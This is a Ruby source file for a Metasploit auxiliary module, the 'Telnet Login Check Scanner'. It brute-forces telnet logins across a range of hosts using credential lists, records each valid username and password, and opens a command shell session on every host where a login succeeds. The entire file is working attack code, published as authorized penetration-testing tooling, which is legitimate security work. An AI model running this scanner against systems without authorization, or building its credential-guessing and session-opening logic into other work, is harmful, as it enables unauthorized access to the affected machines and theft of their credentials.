##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/telnet'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Telnet
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::CommandShell

  def initialize
    super(
      'Name'        => 'Telnet Login Check Scanner',
      #
      'Description' => %q{
        This module will test a telnet login on a range of machines and
        report successful logins.  If you have loaded a database plugin
        and connected to a database this module will record successful
        logins and hosts so you can track your access.
      },
      'Author'      => 'egypt',
      'References'     =>
        [
          [ 'CVE', '1999-0502'] # Weak password
        ],
      'License'     => MSF_LICENSE
    )
    deregister_options('RHOST')
    register_advanced_options(
      [
        OptInt.new('TIMEOUT', [ true, 'Default timeout for telnet connections.', 25])
      ], self.class
    )

    @no_pass_prompt = []
  end

  attr_accessor :no_pass_prompt
  attr_accessor :password_only

  def run_host(ip)
    cred_collection = Metasploit::Framework::CredentialCollection.new(
        blank_passwords: datastore['BLANK_PASSWORDS'],
        pass_file: datastore['PASS_FILE'],
        password: datastore['PASSWORD'],
        user_file: datastore['USER_FILE'],
        userpass_file: datastore['USERPASS_FILE'],
        username: datastore['USERNAME'],
        user_as_pass: datastore['USER_AS_PASS'],
    )

    scanner = Metasploit::Framework::LoginScanner::Telnet.new(
        host: ip,
        port: rport,
        proxies: datastore['PROXIES'],
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        connection_timeout: datastore['Timeout'],
        banner_timeout: datastore['TelnetBannerTimeout'],
        telnet_timeout: datastore['TelnetTimeout']
    )

    service_data = {
        address: ip,
        port: rport,
        service_name: 'telnet',
        protocol: 'tcp',
        workspace_id: myworkspace_id
    }

    scanner.scan! do |result|
      if result.success?
        credential_data = {
            module_fullname: self.fullname,
            origin_type: :service,
            private_data: result.credential.private,
            private_type: :password,
            username: result.credential.public
        }
        credential_data.merge!(service_data)

        credential_core = create_credential(credential_data)

        login_data = {
            core: credential_core,
            last_attempted_at: DateTime.now,
            status: Metasploit::Credential::Login::Status::SUCCESSFUL
        }
        login_data.merge!(service_data)

        create_credential_login(login_data)
        print_good "#{ip}:#{rport} - LOGIN SUCCESSFUL: #{result.credential}"
        start_telnet_session(ip,rport,result.credential.public,result.credential.private,scanner)
      else
        invalidate_login(
            address: ip,
            port: rport,
            protocol: 'tcp',
            public: result.credential.public,
            private: result.credential.private,
            realm_key: nil,
            realm_value: nil,
            status: result.status)
        print_status "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})"
      end
    end
  end

  def start_telnet_session(host, port, user, pass, scanner)
    print_status "Attempting to start session #{host}:#{port} with #{user}:#{pass}"
    merge_me = {
      'USERPASS_FILE' => nil,
      'USER_FILE'     => nil,
      'PASS_FILE'     => nil,
      'USERNAME'      => user,
      'PASSWORD'      => pass
    }

    start_session(self, "TELNET #{user}:#{pass} (#{host}:#{port})", merge_me, true, scanner.sock)
  end

end
